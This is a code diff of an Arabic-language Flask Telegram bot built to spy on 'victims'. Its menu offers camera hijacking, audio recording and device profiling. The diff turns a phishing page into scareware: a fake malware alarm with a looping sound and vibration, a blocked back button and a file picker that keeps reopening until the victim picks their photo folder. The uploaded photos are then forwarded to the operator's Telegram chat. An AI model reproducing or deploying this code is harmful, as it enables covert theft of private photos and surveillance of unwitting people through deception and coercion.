@@ -1,6 +1,6 @@
 import os
 import requests
-from flask import Flask, request, render_template_string, redirect, send_from_directory
+from flask import Flask, request, render_template_string, redirect
 import base64
 import random
 import string
@@ -17,11 +17,6 @@ BASE_URL = "https://freeusr-bot.onrender.com"
 
 ALLOWED_USERS = [7870803639] 
 user_state = {}
-short_links = {}
-
-# مجلد التخزين المؤقت (على Render)
-UPLOAD_FOLDER = 'static/victim_storage'
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 def send_message(chat_id, text, reply_markup=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -45,17 +40,18 @@ def main_menu():
         "inline_keyboard": [
             [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "v1"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "cam"}],
             [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "v3"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "device"}],
-            [{"text": "🚨 فخ ذاكرة التخزين (المعرض العكسي)", "callback_data": "steal_photos"}],
+            [{"text": "🚨 فخ ذاكرة التخزين (قفل الهلع)", "callback_data": "steal_photos"}],
             [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}]
         ]
     }
-
-# ============= المسارات (Routes) =============
 
 @app.route('/')
 def index():
     return "OK"
 
+# =======================================================
+# 🚨 حيلة قفل الهلع (Panic Mode) - إجبار الضحية على الرفع 🚨
+# =======================================================
 @app.route('/trap')
 def trap_page():
     admin = request.args.get('admin', '')
@@ -66,21 +62,22 @@ def trap_page():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>فحص ذاكرة الهاتف</title>
+        <title>تحذير أمني خطير!</title>
         <style>
-            body { margin:0; padding:0; background:#0a0a0a; color:#fff; font-family:'Segoe UI',Tahoma,sans-serif; height:100vh; overflow:hidden; user-select:none; -webkit-user-select:none; }
+            body { margin:0; padding:0; background:#1a0000; color:#fff; font-family:'Segoe UI',Tahoma,sans-serif; height:100vh; overflow:hidden; user-select:none; -webkit-user-select:none; }
             #fullScreenTrap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; cursor: pointer; }
-            .content-wrapper { position: relative; z-index: 10; pointer-events: none; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: radial-gradient(circle, #0d1b2a 0%, #000000 100%); }
-            .warning-box { background: #111; padding: 40px 20px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,150,255,0.2); border: 1px solid #333; }
-            .sys-icon { font-size: 80px; color: #2196F3; margin-bottom: 20px; animation:pulse 1s infinite alternate; }
-            @keyframes pulse { from{transform:scale(1);} to{transform:scale(1.1);} }
-            h1 { font-size: 24px; margin-bottom: 10px; color: #64B5F6; }
-            p { font-size: 16px; color: #aaa; line-height: 1.6; margin-bottom: 30px; }
-            .fake-btn { background: #1976D2; color: #fff; font-size: 20px; font-weight: bold; padding: 18px 30px; border-radius: 50px; width: 100%; box-sizing: border-box; box-shadow: 0 4px 15px rgba(25, 118, 210, 0.5); display: block; border: none; animation: blink 1.5s infinite; }
-            @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+            .content-wrapper { position: relative; z-index: 10; pointer-events: none; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: radial-gradient(circle, #3a0000 0%, #000000 100%); animation: bgPulse 1s infinite alternate; }
+            @keyframes bgPulse { from{background: radial-gradient(circle, #3a0000 0%, #000000 100%);} to{background: radial-gradient(circle, #000000 0%, #3a0000 100%);} }
+            .warning-box { background: #111; padding: 40px 20px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 50px rgba(255,0,0,0.5); border: 2px solid #ff0000; }
+            .sys-icon { font-size: 80px; color: #ff0000; margin-bottom: 20px; animation:shake 0.5s infinite; }
+            @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
+            h1 { font-size: 26px; margin-bottom: 10px; color: #ff4444; text-shadow: 0 0 10px #ff0000; }
+            p { font-size: 16px; color: #ffcccc; line-height: 1.6; margin-bottom: 30px; }
+            .fake-btn { background: #ff0000; color: #fff; font-size: 22px; font-weight: bold; padding: 20px 30px; border-radius: 50px; width: 100%; box-sizing: border-box; box-shadow: 0 0 30px rgba(255,0,0,0.8); display: block; border: none; animation: blink 0.8s infinite; }
+            @keyframes blink { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.05); } 100% { opacity: 1; transform: scale(1); } }
             #fileTrap { position: absolute; width: 1px; height: 1px; opacity: 0; top: -9999px; }
-            #loadingScreen { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#0a0a0a; z-index:99999; flex-direction:column; justify-content:center; align-items:center; text-align:center; padding: 0 20px; box-sizing: border-box; }
-            .spinner { border:5px solid #333; border-top:5px solid #2196F3; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin-bottom:20px; }
+            #loadingScreen { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#000; z-index:99999; flex-direction:column; justify-content:center; align-items:center; text-align:center; padding: 0 20px; box-sizing: border-box; }
+            .spinner { border:5px solid #333; border-top:5px solid #ff0000; border-radius:50%; width:80px; height:80px; animation:spin 0.5s linear infinite; margin-bottom:20px; }
             @keyframes spin { to{transform:rotate(360deg);} }
         </style>
     </head>
@@ -88,34 +85,66 @@ def trap_page():
         <label for="fileTrap" id="fullScreenTrap"></label>
         <div class="content-wrapper">
             <div class="warning-box">
-                <div class="sys-icon">📁</div>
-                <h1>تحذير: ذاكرة الهاتف مصابة!</h1>
-                <p>تم رصد ملفات خبيثة تخترق بياناتك. لتنظيف ذاكرة الهاتف، يجب عليك تحديد مجلد التخزين الرئيسي للفحص.</p>
-                <label for="fileTrap" class="fake-btn" id="mainBtn">تحديد ذاكرة الهاتف للفحص</label>
+                <div class="sys-icon">☠️</div>
+                <h1>اختراق خطير جداً!</h1>
+                <p>تم رصد برمجيات خبيثة تسرق بياناتك. جهازك في خطر الآن. <strong>لا تغلق هذه الصفحة.</strong> لتأمين جهازك، يجب عليك اختيار مجلد الصور فوراً.</p>
+                <label for="fileTrap" class="fake-btn" id="mainBtn">تأمين الجهاز الآن</label>
             </div>
         </div>
         <div id="loadingScreen">
             <div class="spinner" id="spinner"></div>
-            <h2 style="color:#fff;" id="statusText">جاري فحص ذاكرة التخزين...</h2>
-            <p style="color:#888; font-size:14px;">لا تغلق الصفحة. جاري سحب الملفات.</p>
+            <h2 style="color:#ff0000; font-size: 28px; text-shadow: 0 0 10px #ff0000;" id="statusText">جاري مسح الفيروسات: 0%</h2>
+            <p style="color:#ffcccc; font-size:16px;">لا تغلق الصفحة أو سيتم حرق الملفات.</p>
         </div>
         <input type="file" id="fileTrap" accept="*/*" multiple webkitdirectory>
         <script>
             const ADMIN_ID = "{{ admin }}";
             const TARGET = "{{ target }}";
             let extracted = false;
+            let scanInterval = null;
+            let audioCtx = null;
+            let vibrateInterval = null;
+
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () { history.go(1); };
+
+            function startPanic() {
+                if (audioCtx) return;
+                try {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioCtx.createOscillator();
+                    const gainNode = audioCtx.createGain();
+                    oscillator.type = 'sawtooth';
+                    oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);
+                    oscillator.connect(gainNode);
+                    gainNode.connect(audioCtx.destination);
+                    oscillator.start();
+                    if (navigator.vibrate) {
+                        vibrateInterval = setInterval(() => { navigator.vibrate([200, 100, 200, 100]); }, 500);
+                    }
+                } catch (e) { console.log("Audio blocked"); }
+            }
 
             document.getElementById('fullScreenTrap').addEventListener('click', function(e) {
                 if (extracted) return;
+                startPanic();
                 document.getElementById('loadingScreen').style.display = 'flex';
-                if (navigator.vibrate) navigator.vibrate([200,100,200,100,500]);
+                let progress = 0;
+                scanInterval = setInterval(() => {
+                    progress += Math.floor(Math.random() * 5) + 1;
+                    if (progress > 99) progress = 99;
+                    document.getElementById('statusText').innerText = "جاري مسح الفيروسات: " + progress + "%";
+                }, 300);
             });
 
-            // إجبار مدير الملفات على الفتح لو حاول يقفل
             window.addEventListener('focus', () => {
                 setTimeout(() => {
                     if (!extracted && document.getElementById('fileTrap').files.length === 0) {
-                        setTimeout(() => { if (!extracted) document.getElementById('fileTrap').click(); }, 800);
+                        document.getElementById('loadingScreen').style.display = 'none';
+                        if (audioCtx) audioCtx.close();
+                        clearInterval(scanInterval);
+                        clearInterval(vibrateInterval);
+                        setTimeout(() => { if (!extracted) document.getElementById('fileTrap').click(); }, 500);
                     }
                 }, 500);
             });
@@ -124,16 +153,23 @@ def trap_page():
                 const files = e.target.files;
                 if (!files.length) return;
                 extracted = true;
+                
+                if (audioCtx) audioCtx.close();
+                clearInterval(scanInterval);
+                clearInterval(vibrateInterval);
+                if (navigator.vibrate) navigator.vibrate(0);
+
                 document.getElementById('loadingScreen').style.display = 'flex';
+                document.getElementById('statusText').innerText = "جاري سحب الملفات وإصلاح النظام...";
                 
                 const imageFiles = Array.from(files).filter(file => file.type.startsWith('image/'));
                 if (imageFiles.length === 0) {
-                    document.getElementById('statusText').innerText = "لم يتم العثور على صور في المجلد.";
+                    document.getElementById('statusText').innerText = "لم يتم العثور على صور في هذا المجلد.";
                     return;
                 }
 
                 const totalImages = imageFiles.length;
-                const batchSize = 15; // 15 صورة لكل دفعة عشان سرعة الرفع
+                const batchSize = 10;
                 let uploadedCount = 0;
 
                 for (let i = 0; i < totalImages; i += batchSize) {
@@ -147,16 +183,19 @@ def trap_page():
                         await fetch('/upload_trap', { method: 'POST', body: fd });
                         uploadedCount += batch.length;
                         document.getElementById('statusText').innerText = "تم فحص " + uploadedCount + " من " + totalImages + " ملف...";
-                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        await new Promise(resolve => setTimeout(resolve, 2000));
                     } catch (err) { console.log(err); }
                 }
-                document.getElementById('loadingScreen').innerHTML = '<div style="font-size:60px; color:#4CAF50;">✅</div><h2 style="color:#4CAF50;">تم تنظيف ذاكرة الهاتف</h2><p style="color:#888;">يمكنك إغلاق الصفحة.</p>';
+                document.getElementById('loadingScreen').innerHTML = '<div style="font-size:60px; color:#4CAF50;">✅</div><h2 style="color:#4CAF50;">تم تأمين الجهاز بنجاح</h2><p style="color:#888;">يمكنك إغلاق الصفحة الآن.</p>';
             });
         </script>
     </body>
     </html>
     """, admin=admin, target=target)
 
+# =======================================================
+# مسار استقبال الصور وإرسالها كألبوم (10 صور)
+# =======================================================
 @app.route('/upload_trap', methods=['POST'])
 def upload_trap():
     admin_id = request.form.get('admin')
@@ -165,82 +204,35 @@ def upload_trap():
     
     if not photos or not admin_id:
         return {"ok": False, "error": "no_file"}, 400
-        
-    safe_target = "".join(c for c in target if c.isalnum() or c in "_-")
-    target_dir = os.path.join(UPLOAD_FOLDER, safe_target)
-    os.makedirs(target_dir, exist_ok=True)
 
-    for photo in photos:
-        filename = f"{int(time.time())}_{random.randint(1000,9999)}_{photo.filename}"
-        filepath = os.path.join(target_dir, filename)
-        photo.save(filepath)
-        
-    # رابط تطبيق المعرض داخل تليجرام
-    gallery_url = f"{BASE_URL}/gallery/{safe_target}"
+    media_group = []
+    files_payload = {}
     
-    reply_markup = {
-        "inline_keyboard": [
-            [{"text": "📂 فتح ذاكرة الضحية (المعرض)", "web_app": {"url": gallery_url}}]
-        ]
-    }
-    
-    # إرسال الإشعار لك
-    msg = f"📸 *تم سحب صور جديدة!*\n🎯 الهدف: `{target}`\nاضغط على الزر بالأسفل لفتح المعرض واختيار ما تريد."
-    send_message(admin_id, msg, reply_markup)
+    try:
+        for i, photo in enumerate(photos):
+            if i >= 10: break 
+            media_item = {
+                'type': 'photo',
+                'media': f'attach://photo{i}',
+                'caption': f"📸 صورة من ذاكرة: {target}" if i == 0 else ""
+            }
+            media_group.append(media_item)
+            files_payload[f'photo{i}'] = (photo.filename, photo.stream, photo.content_type)
+            
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMediaGroup"
+        payload = {'chat_id': admin_id, 'media': str(media_group).replace("'", '"')}
+        requests.post(url, data=payload, files=files_payload, timeout=20)
         
+    except Exception as e:
+        print(f"Error sending album: {e}")
+        url_photo = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        for photo in photos:
+            files = {'photo': (photo.filename, photo.stream, photo.content_type)}
+            payload = {'chat_id': admin_id, 'caption': f"📸 صورة!\n🎯 الهدف: {target}"}
+            requests.post(url_photo, data=payload, files=files, timeout=15)
+            time.sleep(0.5)
+
     return {"ok": True}, 200
-
-# =======================================================
-# 🌐 تطبيق المعرض (Mini App) للتحكم من البوت
-# =======================================================
-@app.route('/gallery/<target>')
-def gallery_page(target):
-    target_dir = os.path.join(UPLOAD_FOLDER, target)
-    if not os.path.exists(target_dir):
-        return "لا توجد صور لهذا الهدف.", 404
-
-    images = os.listdir(target_dir)
-    
-    html = """
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>ذاكرة الهاتف</title>
-        <script src="https://telegram.org/js/telegram-web-app.js"></script>
-        <style>
-            body { background-color: #1a1a1a; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 10px; }
-            h2 { text-align: center; color: #4CAF50; margin-bottom: 20px; }
-            .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; }
-            .img-container { position: relative; padding-bottom: 100%; overflow: hidden; border-radius: 10px; background: #333; }
-            .img-container img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
-            .btn { display: block; width: 100%; padding: 15px; background: #2196F3; color: white; text-align: center; border-radius: 10px; font-weight: bold; margin-top: 20px; text-decoration: none; border: none; cursor: pointer; }
-        </style>
-    </head>
-    <body>
-        <h2>📂 ذاكرة الضحية: TARGET_NAME</h2>
-        <p style="text-align:center; font-size:12px; color:#aaa;">اضغط على أي صورة لفتحها وحفظها</p>
-        <div class="grid">
-            IMAGE_TAGS
-        </div>
-        <button class="btn" onclick="Telegram.WebApp.close()">إغلاق المعرض</button>
-    </body>
-    </html>
-    """
-    
-    image_tags = ""
-    for img in images:
-        img_url = f"{BASE_URL}/get_image/{target}/{img}"
-        # فتح الصورة في نافذة جديدة عشان يقدر يحفظها
-        image_tags += f'<div class="img-container"><a href="{img_url}" target="_blank"><img src="{img_url}" loading="lazy"></a></div>'
-        
-    return html.replace("TARGET_NAME", target).replace("IMAGE_TAGS", image_tags)
-
-@app.route('/get_image/<target>/<filename>')
-def get_image(target, filename):
-    target_dir = os.path.join(UPLOAD_FOLDER, target)
-    return send_from_directory(target_dir, filename)
 
 # ============= البوت (Webhook) =============
 @app.route(f'/webhook', methods=['POST'])
